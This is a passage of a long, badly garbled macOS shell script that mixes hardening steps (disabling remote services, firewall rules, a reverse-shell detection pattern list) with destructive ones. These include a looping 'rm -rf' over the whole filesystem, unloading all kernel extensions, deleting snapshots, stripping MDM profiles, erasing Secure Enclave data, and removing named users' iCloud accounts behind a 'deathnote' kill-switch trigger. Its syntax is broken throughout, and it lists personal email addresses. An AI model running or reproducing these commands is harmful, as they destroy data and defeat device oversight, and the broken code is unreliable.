                                                 sudo launchctl bootout /System/Library/LaunchDaemons/$daemon.plist

  

  

                                                 # Turn off Remote Apple Events

                                                 sudo systemsetup -setremoteappleevents off

  

                                                 # Turn off Remote AppleScript (if enabled)

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.areserver.plist

  

                                                 echo "Remote management and script execution services have been disabled."

  

                                                 # Disable mDNSResponder (break Bonjour and related services)

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist

  

                                                 # Disable Handoff

                                                 sudo defaults write com.apple.coreservices.useractivityd ActivityAdvertisingEnabled -bool false

                                                 sudo defaults write com.apple.coreservices.useractivityd ActivityReceivingEnabled -bool false

  

                                                 sudo defaults write com.apple.coreservices.useractivityd ActivityAdvertisingEnabled -bool NO

                                                 sudo defaults write com.apple.coreservices.useractivityd ActivityReceivingEnabled -bool NO

  

                                                 # Disable Remote Management

                                                 sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate

  

                                                 # Kill prefs daemon to apply prefs

                                                 sudo killall cfprefsd

  

                                                 echo "Key remote discovery and mirroring services disabled. Manual steps needed for complete disabling of Continuity and AirPlay in System Settings."

  

                                             }

                                             rfDefenseios

                                               sudo mlccshe* & 

                                                 # Install dependencies (brew packages)

                                                 brew install a2ps &

  

                                                 # Enable and start FRR services (adjust paths for macOS)

                                                 sudo brew services start a2ps &

  

  

                                             sudo tee /usr/local/etc/frr/ospfd.conf <<EOF

                                             hostname ospfd

                                             password zebra

  

                                             router ospf

                                             network ${getRouter}* area 0.0.0.0

                                             EOF

  

  

  

                                                 # Restart FRR to apply config

                                                 sudo brew services restart a2ps

                                                 echo "FRR OSPF configured and started on macOS"

  

                                             }

                                             scanAirdrop=(

  

                                                 if command -v blueutil >/dev/null 2>&1; then

                                                   echo "blueutil is installed."

                                                   while ! true

                                                   do

                                                       sudo airdropapp

                                                   done

                                                 else

                                                     echo "Homebrew not found, installing Homebrew..." &

                                                     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" &

                                                     # Add brew to PATH for current shell session (modify for your shell if needed) &

                                                     echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zshrc && sudo rm -rf ~/.zprofile &

                                                     eval "$(/opt/homebrew/bin/brew shellenv)" &

                                                     echo "Installing blueutil via Homebrew..." &

                                                     && brew install blueutil &

                                                     echo "blueutil is not installed."

                                                 fi

  

  

                                             airdropapp

                                                 devices=(sudo blueutil --inquiry)

  

                                                   if echo "$devices" | grep -q "$TARGET_MAC"; then

                                                     echo "Device found: $TARGET_MAC. Attempting connection..."

  

                                                     # Connect via blueutil (make sure your AirDrop device allows incoming connections)

                                                     sudo blueutil --connect $TARGET_MAC

  

                                                     # Optionally open AirDrop UI for manual file transfer if needed

                                                     open /System/Library/CoreServices/Finder.app/Contents/Applications/AirDrop.app

                                                     # sleep longer after connection to avoid spamming

                                                   else

                                                     echo "Device not found. Scanning again..."

                                                     sleep* 1

                                                   fi

                                             }

  

                                             }

                                             mdnsIP

                                                 # Browse for all _services._dns-sd._udp local services first to discover types

                                                 echo "Discovering available mDNS services on local network..."

                                                 services=(sudo dns-sd -B _services._dns-sd._udp local | grep '^  ' | awk '{print $1}' | sort | uniq)

  

                                                 echo "Available mDNS service types:"

  

                                                 # For each discovered service type, browse and resolve names and IPs

                                                 for service in $services; do

                                                   # echo "Browsing for service type: $service"

  

                                                   # Run dns-sd browse in background, limited time

                                                   timeout 5 dns-sd -B "$service" local | while read -r line; do

                                                     # Example line: DATE TIME ADD 3 5 en0 _http._tcp.local. MyDevice

                                                     if echo "$line" | grep -q 'Add'; then

                                                       # Extract instance name and domain

                                                       instanceecho "$line" | awk '{print $7}')

                                                       type=(echo "$line" | awk '{print $6}')

  

                                                       # Resolve instance to IP in background to avoid blocking

                                                       sudo dns-sd -L "$instance" "$type" local | while read -r resolve_line; do

                                                         if echo "$resolve_line" | grep -q 'Address'; then

                                                           ip=(echo "$resolve_line" | awk '{print $4}')

                                                           echo "Instance: $instance, Service: $service, IP: $ip"

                                                         fi

                                                       done

                                                     fi

                                                   done

                                                 done

  

                                             }

  

                                             disablereversShell

                                                 # Define firewall command based on OS

                                                 if [[ "$(uname)" == "Darwin" ]]; then

                                                   # macOS uses pf for firewall - we will use pfctl instead of iptables/nft

                                                   FW_BLOCK_CMD() {

                                                     local ip=$1

                                                     echo "block drop quick from $ip to any" | sudo pfctl -a block_revshell -f -

                                                   }

                                                   ENABLE_PF_ANCHOR() {

                                                     echo "Anchor rules for blocking are enabled manually prior."

                                                   }

                                                 else

                                                   # Linux, Android - using iptables

                                                   FW_BLOCK_CMD() {

                                                     local ip=$1

                                                     sudo iptables -A INPUT -s $ip -j DROP

                                                     sudo iptables -A OUTPUT -d $ip -j DROP

                                                   }

                                                   ENABLE_PF_ANCHOR() {

                                                     echo "No anchor enable necessary on Linux iptables"

                                                   }

                                                 fi

  

                                                 echo "Scanning for established reverse shell connections..."

  

                                                 # This "netstat" or "ss" command lists all established connections with process info

                                                 # We'll assume reverse shell uses TCP and shell processes like bash, sh, or nc.

  

                                                 if command -v sudo ss &>/dev/null; then

                                                   # Use ss where available

                                                   CONNS=(sudo ss -tanp | grep ESTAB)

                                                 else

                                                   CONNS=(sudo netstat -tanp 2>/dev/null | grep ESTABLISHED)

                                                 fi

  

                                                 # Example patterns for common reverse shell processes

                                                 PATTERNS="bash|sh|nc|netcat|python|perl|ruby"

  

                                                 echo "Found connections:"

                                                 echo "$CONNS" | grep -Ei "$PATTERNS"

  

                                                 # Parse connections and kill them

                                                 while read -r line; do

                                                   # Extract source IP and port, pid/process

                                                   SRC_IP=(echo "$line" | awk '{print $5}' | cut -d':' -f1)

                                                   PID=(echo "$line" | grep -oP 'pid=\K[0-9]+' | head -n1)

  

                                                   [[ -z "$SRC_IP" || -z "$PID" ]] && continue

  

                                                   echo "Blocking IP $SRC_IP and killing process $PID"

  

                                                   # Block IP

                                                   FW_BLOCK_CMD "$SRC_IP"

  

                                                   # Kill process

                                                   sudo kill -9 "$PID"

  

                                                 done <<< "$(echo '$CONNS' | grep -Ei '$PATTERNS')"

  

                                                 # Enable pf anchor in macOS (if needed)

                                                 ENABLE_PF_ANCHOR

  

                                                 echo "Done blocking and killing suspected reverse shells."

  

  

                                             }

  

                                             checkFocus

                                                 FocusState=$1

                                                 FOCUS_STATE=(sudo defaults read com.apple.controlcenter "NSStatusItem Visible FocusModes" 2>/dev/null)

                                                 if [[ "$FOCUS_STATE" == "deathnote" | "$FOCUS_STATE" == "Kill Switch" | "$serial_number" == "$QQDEVICE" | "$FOCUS_STATE" == "1" ]]; then

                                                   echo "Focus mode is enabled"

                                                   sudo setFocus 'deathnote'

                                                   $LETHALSTATEQQ

                                                   sudo open "shortcuts://run-shortcut?name=QQ*" &

                                                    sudo open "shortcuts://run-shortcut?name=*" &

                                                 elif [[ "$FOCUS_STATE" == "QQVISION" & "$serial_number" == "$QQDEVICE" | "$FOCUS_STATE" == "1"]]; then

                                                     $LETHALSTATEQQ

                                                      sudo open "shortcuts://run-shortcut?name=*" &

                                                    sudo open "shortcuts://run-shortcut?name=*" &

                                                     sudo setFocus 'deathnote'

                                               elif [[ "$FOCUS_STATE" == "RED" & "$FOCUS_STATE" == "1"]]; then

                                                   $REDSTATE

                                                    sudo setFocus 'deathnote'

                                                 elif [[ "$FOCUS_STATE" == "BLACK" & "$FOCUS_STATE" == "1" ]]; then

                                                     $BLACKSTATE

                                                      sudo setFocus 'deathnote'

                                                 else

                                                     echo "No focus mode enabled"

                                                     $WHITESTATE

                                                 fi

  

                                             }

                                             setMode

                                                 tell application "System Preferences"

                                                   activate

                                                   reveal anchor "displaysDisplayTab" of pane id "com.apple.preference.displays"

                                                 end tell

                                             }

                                             disableusboveripvnc=(

                                               PORT=$1

                                                 while ! true

                                                 do

                                                     # Firewalld blocks

                                                     #

                                                     sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="$PORT" protocol="tcp" reject'

                                                     sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="3240" protocol="tcp" reject'

                                                     sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="5900" protocol="tcp" reject'

                                                     sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="9418" protocol="tcp" reject'

                                                     sudo firewall-cmd --reload

  

                                                     # Pf block rules file path (adjust if different)

                                                     PF_CONF="/etc/pf.conf"

  

                                                     # Get established local ports

                                                     revport=(sudo netstat -anv | grep ESTABLISHED | awk '{print $4}' | awk -F '.' '{print $NF}' | sort | uniq)

                                                     maliciousIP

                                                     # Backup current pf.conf

                                                     sudo cp $PF_CONF ${PF_CONF}.bak

                                                     localhostPort=(sudo lsof -i -P | grep '127.0.0.1.*ESTABLISHED' | grep :PORT)

                                                     mlocalhostPort=(sudo lsof -i -P | grep '*.local' | grep :PORT)

                                                     port=(3240 5900...6500 631 445 22 5353 5900...5999 replayPORT 9418 9481 3000 8080 6000 9050 548 5353 $localhostPort $mlocalhostPort)

                                                     grep -q "block drop proto tcp from any to any port $PORT" $PF_CONF || echo "block drop proto udp from any to any port 3240" | sudo tee -a $PF_CONF

                                                     grep -q "block drop proto tcp from any to any port $port" $PF_CONF || echo "block drop proto udp from any to any port 3240" | sudo tee -a $PF_CONF

                                                     grep -q "block drop quick on any proto tcp from any to any $revport" $PF_CONF || echo "block drop quick on any proto udp from any to any $revport" | sudo tee -a $PF_CONF

                                                     grep -q "block drop quick on any proto tcp from any to any $revport" $PF_CONF || echo "block drop quick on any proto udp from any to any $revport" | sudo tee -a $PF_CONF

                                                     grep -q "block drop quick on any proto tcp from any to $malicious_ip port any" $PF_CONF || echo "block drop quick on any proto tcp from any to $malicious_ip port any" | sudo tee -a $PF_CONF

  

  

  

  

                                                     # Reload pf rules

                                                     sudo pfctl -f $PF_CONF

                                                     sudo pfctl -e

  

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /usr/libexec/sshd-keygen-wrapper

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /System/Library/PrivateFrameworks/Sharing.framework/Versions/A/XPCServices/sharingd.xpc/Contents/MacOS/sharingd

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent

  

  

                                                 echo "anchor \"blockkevt\"" | sudo tee -a /etc/pf.conf

                                                 echo "load anchor \"blockkevt\" from \"/etc/pf.anchors/blockkevt\"" | sudo tee -a /etc/pf.conf

                                                 sudo pfctl -f /etc/pf.conf

                                                 sudo pfctl -e

                                             done

  

                                                 # Example: Disconnect device #1

                                                 ./vhclientx86_64 -t "STOP USING,1"

  

                                                 PIPE="/tmp/vhclient"

  

                                                 # Example: List attached USB devices

                                                 echo "LIST" > "$PIPE"

                                                 cat /tmp/vhclient_response

  

  

  

                                                 # Block VNC ports (5900-5905)

                                                 for port in {5900..5905}; do

                                                   sudo iptables -A INPUT -p tcp --dport $port -j DROP

                                                   sudo firewall-cmd --permanent --remove-port=$port/$proto &

                                                   sudo firewall-cmd --reload

                                                 done

  

                                                 echo "Blocked VNC ports 5900-5905."

  

                                                 PF_RULES="/etc/pf.anchors/block_vnc_usb"

                                                 echo "block drop quick proto tcp from any to any port 5900:5905" | sudo tee $PF_RULES

  

                                                 if ! grep -q "anchor \"block_vnc_usb\"" /etc/pf.conf; then

                                                   echo "anchor \"block_vnc_usb\"" | sudo tee -a /etc/pf.conf

                                                   echo "load anchor \"block_vnc_usb\" from \"$PF_RULES\"" | sudo tee -a /etc/pf.conf

                                                 fi

  

                                                 sudo pfctl -f /etc/pf.conf

                                                 sudo pfctl -e

  

                                             }

                                             blockVNCDuckduckgo

                                                 # Resolve DuckDuckGo IP (example, adjust if multiple or IPv6)

                                                 DUCK_IP=(sudo dig +short duckduckgo.com | grep '^[0-9]' | head -n 1 RECKON)

  

                                                 if [ -z "$DUCK_IP" ]; then

                                                   echo "Failed to resolve DuckDuckGo IP"

                                                   exit 1

                                                 fi

  

                                                 # Create pf anchor file for blocking VNC traffic to DuckDuckGo IP

                                                 PF_ANCHOR="/etc/pf.anchors/block_vnc_duck"

                                                 echo "block drop quick proto tcp from any to $DUCK_IP port 5900" | sudo tee $PF_ANCHOR

                                                  echo "block drop quick proto tcp from any to $DUCK_IP" | sudo tee $PF_ANCHOR

  

                                                 # Add anchor to main pf.conf if not already present

                                                 if ! grep -q "anchor \"block_vnc_duck\"" /etc/pf.conf; then

                                                   echo "anchor \"block_vnc_duck\"" | sudo tee -a /etc/pf.conf

                                                   echo "load anchor \"block_vnc_duck\" from \"$PF_ANCHOR\"" | sudo tee -a /etc/pf.conf

                                                 fi

  

                                                 # Enable pf with new rules

                                                 sudo pfctl -f /etc/pf.conf

                                                 sudo pfctl -e

                                                 # echo "VNC traffic to DuckDuckGo ($DUCK_IP) is now blocked."

  

                                             }

                                             sendmessageios

                                                 message=$1

                                                 number=$2

                                                 osascript -e 'tell application "Messages" to send "$message" to buddy "$number"'

                                             }

                                             signOutAllIcloud=(

  

  

  

                                               for userDir in /Users/$gmailID; do

                                                     if [ -d "$userDir/Library/Preferences" ]; then

                                                       plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                       if [ -f "$plist" ]; then

                                                         echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                         rm "$plist"

                                                       fi

                                                     fi

                                                 done

  

  

                                                 for userDir in /Users/*; do

                                                   if [ -d "$userDir/Library/Preferences" ]; then

                                                     plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                     if [ -f "$plist" ]; then

                                                       echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                       rm "$plist"

                                                     fi

                                                   fi

                                                 done

  

                                                  for userDir in /Users/soa*; do

                                                    if [ -d "$userDir/Library/Preferences" ]; then

                                                      plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                      if [ -f "$plist" ]; then

                                                        echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                        rm "$plist"

                                                      fi

                                                    fi

                                                  done

  

                                                 for userDir in /Users/hellson*; do

                                                   if [ -d "$userDir/Library/Preferences" ]; then

                                                     plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                     if [ -f "$plist" ]; then

                                                       echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                       rm "$plist"

                                                     fi

                                                   fi

                                                 done

  

                                                  for userDir in /Users/*jylee; do

                                                    if [ -d "$userDir/Library/Preferences" ]; then

                                                      plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                      if [ -f "$plist" ]; then

                                                        echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                        rm "$plist"

                                                      fi

                                                    fi

                                                  done

  

  

                                                 for userDir in /Users/morrischang*; do

                                                   if [ -d "$userDir/Library/Preferences" ]; then

                                                     plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                     if [ -f "$plist" ]; then

                                                       echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                       rm "$plist"

                                                     fi

                                                   fi

                                                 done

  

                                                 for userDir in /Users/haedongshin*; do

                                                   if [ -d "$userDir/Library/Preferences" ]; then

                                                     plist="$userDir/Library/Preferences/MobileMeAccounts.plist"

                                                     if [ -f "$plist" ]; then

                                                       echo "Removing iCloud account plist for user: $(basename "$userDir")"

                                                       rm "$plist"

                                                     fi

                                                   fi

                                                 done

  

  

                                                 # Kill the preferences daemon to reload plist changes

                                                 sudo killall cfprefsd

  

                                                 echo "iCloud sign-out triggered for all users."

  

                                             }

                                             usbmanagement

                                                 # Check if any USB device connected by searching for "USB"

                                                 if sudo system_profiler SPUSBDataType | grep -q "USB"; then

                                                   echo "USB device is connected."

                                                   sudo actionBtn &

                                                 else

                                                   echo "No USB device connected."

                                                   sudo actionBtn &

                                                 fi

  

                                             }

                                             daemonManagement

                                                 OPTION=$1

                                                 # Unload all user agents

                                                 sudo launchctl list | grep -v PID | awk '{print $3}' | while read -r label; do

                                                   echo "Unloading user agent: $label"

                                                   launchctl $OPTION gui/$(id -u) "$label"

                                                 done

  

                                                 # Unload all system daemons (requires sudo)

                                                 sudo launchctl list | grep -v PID | awk '{print $3}' | while read -r label; do

                                                   echo "Unloading system daemon: $label"

                                                   sudo launchctl $OPTION system "$label"

                                                 done

  

                                             }

  

                                             usbQQoff

                                               while ! true

                                               do

                                               sudo pmset -g | grep hibernatemode

                                               sudo pmset -a hibernatemode 3 0 

                                               done

                                             }

  

                                             usbPower

                                               while ! true

                                               do

                                                 sudo pmset -a hibernatemode 25

                                                 sudo kextunload /System/Library/Extensions/IOUSBMassStorageClass.kext

                                                 sudo kextunload /System/Library/Extensions/*

                                                 done

                                             }

  

                                             continuityFeature

                                                 sudo defaults write com.apple.applicationaccess allowiPhoneMirroring -bool false

                                                 sudo defaults write com.apple.applicationaccess allowiPhoneMirroring -bool NO

                                                 sudo launchctl disable system/com.apple.remoted

                                                 sudo launchctl disable system/com.apple.cupsd

                                                 sudo launchctl disable system/com.apple.sharingd

                                                 sudo launchctl disable system/com.apple.CoreDevice.remotepairingdeviced

                                                 sudo launchctl disable system/com.apple.dt.xcode_select.tool-shim

                                                 sudo launchctl disable system/ com.apple.set*

                                             }

  

                                             logoutIcloud

                                                 ID=(qqontheskyshell@icloud.com qqontheskyshell@gmail.com slowoasis@icloud.com qqonthesky@icloud.com)

                                                 tell application "System Events"

                                                     tell process "System Preferences"

                                                         activate

                                                         tell application "System Preferences"

                                                             reveal anchor "iCloud" of pane id "$ID"

                                                             # com.apple.preference.accounts

                                                         end tell

                                                         delay 2

                                                         click button "Sign Out" of window "iCloud"

                                                         delay 2

                                                         click button "Sign Out" of sheet 1 of window "iCloud"

                                                     end tell

                                                 end tell

  

                                             }

                                             deletesnapshot

                                                 # List all local snapshots

                                                 echo "Listing all local snapshots..."

                                                 # sudo tmutil listlocalsnapshots /

  

                                                 # Delete all local snapshots

                                                 echo "Deleting all local snapshots..."

                                                 sudo tmutil thinlocalsnapshots / 9999999999999999 1

  

                                                 echo "Done."

  

                                             }

                                             hideiosapp

                                                 app=$1

                                                 while ! true

                                                 do

                                                     sudo lldb -n sonic -o "process interrupt" -o "process continue"

                                                     sudo osascript -e 'tell application "System Events" to set visible of application process "$app" to false'

                                                     # Name of the app to uninstall

                                                     APP_NAME=$app

                                                     # Uninstall the app using ideviceinstaller

                                                     sudo ideviceinstaller -U $APP_NAME

                                                     echo "Sonic app has been uninstalled from the iOS device."

                                                 done

                                             }

                                             disabledebugios=(

                                               sudo rm -rf  /Library/Preferences/com.apple.usbmuxd.plist

                                             sudo killall usbmuxd  # Restart daemon with default logging

  

                                                 # Remove all provisioning profiles

                                                 sudo rm -rf ~/Library/MobileDevice/Provisioning\ Profiles/*

  

                                                 # Reset Xcode's derived data (optional)

                                                 sudo rm -rf ~/Library/Developer/Xcode/DerivedData/

  

                                                 sudo killall Xcode* Terminal

                                                 # Suspend app execution

                                                 sudo process interrupt

                                                 # Or kill app

                                                 sudo process kill

  

                                             }

  

                                             removeAirtag=(

                                             # Example Bash helper to prep ESP32 (install esptool.py first)

                                             esptool.py --chip esp32 --port /dev/cu.usbserial-* erase_flash  # Erase target

                                             # Then use OpenHaystack app: Connect device > Deploy firmware

  

                                             }

  

                                             removespotifyXcconfig

                                             # Define the root directory of the Xcode project

                                             PROJECT_ROOT="$osxBASEURL"

  

                                             # Find and remove Spotify-related xcconfig files

                                             find "$PROJECT_ROOT" -name "*spotify*.xcconfig" -print -exec sudo rm -f {} \

  

                                             echo "Removed Spotify xcconfig files."

  

                                             # Remove Spotify xcconfig references in .pbxproj files (project settings)

                                             # Backup first

                                             cp "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj" "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj.bak"

  

                                             # Remove lines referencing Spotify xcconfig files

                                             sudo sed -i.bak '/spotify.*\.xcconfig/d' "$PROJECT_ROOT/YourProject.xcodeproj/project.pbxproj"

  

                                             echo "Cleaned Spotify xcconfig references in project.pbxproj."

  

                                             # Optionally clean build folder

                                             sudo xcodebuild clean -project "$PROJECT_ROOT/YourProject.xcodeproj"

  

                                             echo "Project cleaned of Spotify xcconfig."

  

  

                                             }

                                             # Function to find and delete .xcconfig files

                                             removeXcconfig() {

                                                 echo "Finding and deleting all .xcconfig files within /..."

                                                 files.DS* EOF *.xcconfig backup* .fs* .localized)

                                                 # Use find to locate all .xcconfig files and delete them

                                                 while ! true 

                                                 do

                                                 sudo find / -type f -name "$files" -exec sudo rm -rf {} \

                                                 done

                                                 echo "All .xcconfig files have been deleted."

                                             }

  

                                             disableRemoteosx

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.screensharing.plist

  

                                                 # Disable Apple Events

                                                 sudo defaults write /Library/Preferences/com.apple.AppleEvents disableAppleEvents -bool true

                                                 sudo defaults write /Library/Preferences/com.apple.AppleEvents disableAppleEvents -bool YES

                                                 # Disable Handoff (Continuity feature)

                                                 sudo defaults write com.apple.coreservices.useractivityd.plist ActivityAdvertisingAllowed -bool NO

                                                 sudo defaults write com.apple.coreservices.useractivityd.plist ActivityReceivingAllowed -bool NO

                                                 sudo defaults write com.apple.coreservices.useractivityd.plist ActivityAdvertisingAllowed -bool false

                                                 sudo defaults write com.apple.coreservices.useractivityd.plist ActivityReceivingAllowed -bool false

  

                                                 # Disable AirDrop (set to no one)

                                                 sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

  

                                                 # Disable Remote Management (Apple Remote Desktop)

                                                 sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop

  

                                                 # Disable Remote Login (SSH)

                                                 sudo systemsetup -setremotelogin off

                                                 sudo systemsetup -setremotemanagement off

                                                 # Disable remote Apple events

                                                 sudo systemsetup -setremoteappleevents off

  

                                                 # Disable Screen Sharing

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.screensharing.plist

  

                                                 # Disable Bluetooth (which Continuity uses)

                                                 sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 1

  

  

                                                 # Disable Universal Control and Handoff via system preferences plist (macOS Ventura+)

                                                 sudo defaults write ~/Library/Preferences/.GlobalPreferences.plist com.apple.universalcontrol.plist -dict Enabled -bool false

                                                 sudo defaults write com.apple.universalcontrol.plist Enabled -bool false

  

                                                 # Disable AirPlay Receiver (macOS Monterey and later)

                                                 sudo defaults write com.apple.airplayreceiver AirPlayReceiverAllowed -bool true

                                             sudo defaults write com.apple.airplayreceiver AirPlayReceiverAllowed -bool YES

                                                 # Block VNC ports 5900 and 3283 on USB interfaces using pfctl (optional)

                                                 echo "block drop proto tcp from any to any port {5900, 3283} on usb0" | sudo pfctl -ef -

  

                                             }

  

                                             disableMDM=(

  

                                             PROFILE_TOOL="/usr/bin/profiles"

  

                                             if [[ $EUID -ne 0 ]]; then

                                               echo "Run as root: sudo $0"

                                               exit 1

                                             fi

  

                                             # List installed profiles

                                             sudo $PROFILE_TOOL list

  

                                             # Remove ALL profiles (including MDM enrollment if removable)

                                             $PROFILE_TOOL remove -all

  

  

  

                                                 sudo mdms* &

                                             TARGET="qqontheskyshell.mobileconfig"  # Adjust if using ID instead

  

                                             echo "Installed profiles:"

                                             sudo profiles -P

  

                                             # Remove all except target (replace with loop over IDs from list if many)

                                             sudo profiles -D  # Deletes ALL removable profiles first (backs up target implicitly if system)

  

                                             # Selective remove by ID (example; get IDs from profiles -P)

                                             sudo profiles -R -p "com.qqontheskyshell.*"  # Repeat for each unwanted ID

  

                                             # Force erase profile data (post-removal cleanup)

                                             sudo rm -rf /var/db/ConfigurationProfiles/Settings/*.plist

                                             sudo touch /var/db/ConfigurationProfiles/Settings/.profilesAreInstalled

  

                                             # Restart cfprefsd for changes

                                             sudo killall cfprefsd

                                                 # sudo su && cd /var/db/ConfigurationProfiles && sudo rm -rf * &

                                                 # # && mkdir Settings && touch Settings/.profilesAreInstalled

  

                                                 # sudo profiles -R -p * &

                                                 # sudo profiles remove -all &

                                                 # sudo killall '*mdm*' &

                                                 # sudo rm -rf /var/db/ConfigurationProfiles/* &

                                                 # sudo mkdir /var/db/ConfigurationProfiles/Settings &

                                                 # sudo touch /var/db/ConfigurationProfiles/Settings/.profilesAreInstalled &

                                                 # # Must run as root

                                                 # if [ "$(id -u)" -ne 0 ]; then

                                                 #   echo "This script must be run as root."

                                                 #   exit 1

                                                 # fi

  

                                                 # echo "Removing all configuration profiles (including MDM)..."

  

                                                 # # Remove all configuration profiles forcibly (including MDM)

                                                 # sudo profiles -D -f &

                                                 # sudo pkill mdmclient &

                                                 # echo "Removing MDM enrollment receipts and system settings..."

  

                                                 # Remove MDM-related receipts (specific to Apple's MDM framework)

                                                 sudo rm -rf /var/db/lockdown/*.plist &

  

                                                 # Disable Apple push notification daemon for MDM (apsd)

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.apsd.plist &

                                                 # Disable MDM profile service to stop it from re-enrolling or communicating

                                                 sudo launchctl bootout /System/Library/LaunchDaemons/com.apple.mdmclient.agent.plist 2>/dev/null || true &

  

                                             }

  

                                             disablerootosx

                                                 # Must run as root (sudo)

                                                 if [ "$(id -u)" -ne 0 ]; then

                                                   echo "Run this script as root or with sudo"

                                                   exit 1

                                                 fi

  

                                                 # Get current root shell

                                                 rootshell=(sudo /usr/bin/dscl . -read /Users/root UserShell | awk '{print $2}')

  

                                                 if [[ "$rootshell" != "/usr/bin/false" ]]; then

                                                   echo "Setting root shell from $rootshell to /usr/bin/false to disable root login."

                                                   if [[ -z "$rootshell" ]]; then

                                                     #sudo /usr/bin/dscl . -create /Users/root UserShell /usr/bin/false

                                                 sudo /usr/bin/dscl . -change /Users/root UserShell "$rootshell" /usr/bin/false

                                                   else

                                                     sudo /usr/bin/dscl . -change /Users/root UserShell "$rootshell" /usr/bin/false

                                                   fi

                                                 else

                                                   echo "Root shell is already set to /usr/bin/false. Root login disabled."

                                                 fi

  

                                                 echo "Optionally, to fully disable root user, run: 

                                                 sudo dsenableroot -d (requires root password)"

                                                 sudo sc_auth unpair -h * &

                                                 sudo defaults write /Library/Preferences/com.apple.security.smartcard allowSmartCard -bool false &

                                               sudo defaults write /Library/Preferences/com.apple.security.smartcard allowSmartCard -bool NO &

  

  

                                             }

  

  

                                             eraseSeccureEnclave

                                                 # Function to get system information

                                                 get_system_info() {

                                                     echo "Gathering system information..."

                                                     system_profiler SPHardwareDataType

                                                     system_profiler SPSoftwareDataType

                                                     system_profiler SPMemoryDataType

                                                     system_profiler SPStorageDataType

                                                 }

  

                                                 # Function to find the session ID

                                                 find_session_id() {

                                                     echo "Finding session ID..."

                                                     system_profile=(sudo system_profiler SPHardwareDataType)

                                                     session_id=(echo "$system_profile" | grep -A $num "Serial Number" | grep -oP "(?<=Serial Number: ).*)")

                                             }

  

                                                 # Main script execution

                                                 # get_system_info

                                                 # find_session_id

  

                                             echo "Mac hostname: $(scutil --get ComputerName 2>/dev/null || hostname)"

                                             echo "Current user: $(stat -f %Su /dev/console 2>/dev/null || echo unknown)"

                                             echo "MDM enrollment profile:"

                                             profiles status -type enrollment 2>/dev/null || echo "profiles command unavailable or no enrollment status"

  

                                             echo

                                             echo "Platform SSO / account-related status:"

                                             sysadminctl -secureTokenStatus "$(stat -f %Su /dev/console 2>/dev/null || echo unknown)" 2>/dev/null || true

  

                                                 sudo xarutil --erase find_session_id

                                                 sudo $XARTURL --erase find_session_id

                                             &

                                             }

  

  

                                             monitorAirDropState

                                                 # Check AirDrop status by reading the preference key

                                                 status=(sudo defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null)

  

                                                 # DisableAirDrop=1 means AirDrop is disabled, so we enable it by setting to 0 or removing key

                                                 if [[ "$status" == "1" ]]; then

                                                   echo "AirDrop is disabled. Enabling AirDrop..."

                                                   sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

                                                   sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool false

                                                 else

                                                     sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

                                                     sudo defaults write com.apple.NetworkBrowser DisableAirDrop -bool NO

                                                 fi

                                             }

                                             airdopModifcation

                                             while ! true do monitorAirDropState done

                                                 # Function to enable AirDrop

  

                                                  if [[ "$FOCUS_STATE" == "qqwithme" ]]; then

                                                 enableAirdrop() {

  

                                             # Enable AirDrop visibility (Everyone or Contacts; requires System Settings toggle post-script)

                                             sudo /usr/libexec/airport awd enable &

  

                                             # Alternative: Use defaults for Bonjour/AirDrop visibility

                                             sudo defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool YES &

                                             sudo defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true &

                                             sudo defaults write com.apple.NetworkBrowser RecordEnable -string 'Stationary - With - Direct' &

  

                                             # Restart Bonjour/mDNSResponder for changes

                                             sudo killall -HUP mDNSResponder &

                                             sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool false &

                                             sudo defaults write /Library/Preferences/com.apple.NetworkBrowser.plist "DisableAirDrop" -bool NO &

  

                                             # Get current user

                                             CurrentUser=(ls -l /dev/console | awk '{ print $3 }')

  

                                             # Enable Wi-Fi and Bluetooth for current user

                                             su -l "$CurrentUser" -c 'sudo networksetup -setairportpower en0 $wifiMode' 

                                             su -l "$CurrentUser" -c 'sudo blueutil --power 1'

  

                                             open /System/Library/CoreServices/Finder.app/Contents/Applications/AirDrop.app

  

                                                 }

                                             else

                                                 # Function to disable AirDrop

                                                 disableAirdrop() {

